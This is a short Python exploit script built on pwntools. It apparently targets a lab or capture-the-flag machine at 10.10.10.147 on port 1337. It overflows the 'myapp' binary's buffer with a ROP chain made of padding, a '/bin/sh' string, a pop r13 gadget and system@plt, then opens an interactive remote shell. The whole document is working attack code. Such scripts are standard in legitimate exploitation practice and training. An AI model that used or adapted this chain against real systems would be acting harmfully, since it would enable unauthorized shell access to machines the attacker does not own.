#!/usr/bin/python3

from pwn import *

## **LOCALTEST**

#context(os='linux', arch='amd64')
#context(terminal=['tmux', 'new-window'])
# p = gdb.debug("./myapp", "b *main")
## GO UNTIL GET THAT STRING
# p.recvuntil("What do you want me to echo back?")

## **REMOTE**
p = remote("10.10.10.147", 1337)

# JUNK = 120 - len(bin_sh) (NULLBYTE = len1)
junk = b"A"*112
bin_sh = b"/bin/sh\x00"
       
# ropper --file myapp --search "pop r13" 
## --> pop r13, pop r14, pop r15
pop_r13 = p64(0x401206)

nullByte = p64(0x0)

# objdump -D myapp| grep system
#  --> 0000000000401040 <system@plt>
system_plt = p64(0x401040)

# objdump -D myapp| grep test                          
#  --> 0000000000401152 <test>:
test = p64(0x401152)

payload = junk + bin_sh + pop_r13 + system_plt + nullByte + nullByte + test

p.sendline(payload)
# TO GET INTERACTIVE TERMINAL
p.interactive()
